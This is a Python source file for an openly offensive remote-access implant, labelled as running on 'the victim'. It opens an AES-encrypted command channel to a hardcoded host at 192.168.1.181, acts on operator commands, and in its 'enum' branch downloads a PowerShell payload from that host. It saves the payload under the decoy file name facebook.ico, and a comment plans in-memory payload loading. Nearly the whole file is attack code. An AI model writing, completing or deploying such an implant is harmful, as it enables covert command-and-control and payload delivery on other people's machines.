#shellengine the victim 
import socket
import os
import sys
import time
import requests
from termcolor import colored
from Crypto.Cipher import AES

keys = {
    'enc0': 'A3317AF79FEB1C1778E27AFE728BEF8B',
    'enc1': '4CB54FEC78114473387BD86400EDF85B',
    'enc2': '9C2B81E47254333AA1218FB1B7697CEB',
    'enc3': 'E814DD5D259E8237D02A19F9CB8D078B'
}


def key_gen():
    print(colored("[+]Initializing Encryption Channel", 'green'))
    global enc_key
    enc_key = 'EBC3D4C51C46801A7267AAB59A63551B'

def start_encryption(key):
    global magic
    magic = AES.new(f'{key}', AES.MODE_CFB, 'This is an IV456') #StackOverflow LOL!
    print("\n" + key + "\n")

def Enum():
    time.sleep(5)
    url = 'http://192.168.1.181:88/RB01-A.ps1'      #will be replaced with powershell code to load payload Directly into memory
    r = requests.get(url, allow_redirects=True)
    open('facebook.ico','wb').write(r.content)
    time.sleep(10)


planted = "[+] Engine Planted SuccessFully"
enum = "[+] Shell-Engine::Sleeping For 10 seconds"
enum2 = "[+] Fetching Enumeration Payload"
enum_payload_sucess = "[+] Payload Fetched Successfully Trigger Time Set-To 10sec"
err = "[+] shell-Engine:: ambiguous command"

s = socket.socket()
s.connect(('192.168.1.181',80))
key_gen()
start_encryption(enc_key)

def recv_data():
    In_msg = s.recv(8192)
    recv_data = magic.decrypt(In_msg)
    global recv_data_dec
    recv_data_dec = recv_data.decode()

while True:
    recv_data()
    if recv_data_dec == 'run':
        s.send(magic.encrypt(planted.encode()))
    elif recv_data_dec == 'enum':
        s.send(magic.encrypt(enum.encode()))
        time.sleep(10)
        print(colored("[+] Switching to Second Stage Encryption Key::10sec-sleep"))
        start_encryption(keys.get('enc0'))
        Enum()
    elif recv_data_dec == 'error':
        s.send(magic.encrypt(err.encode()))
    elif recv_data_dec == 'exit':
        break


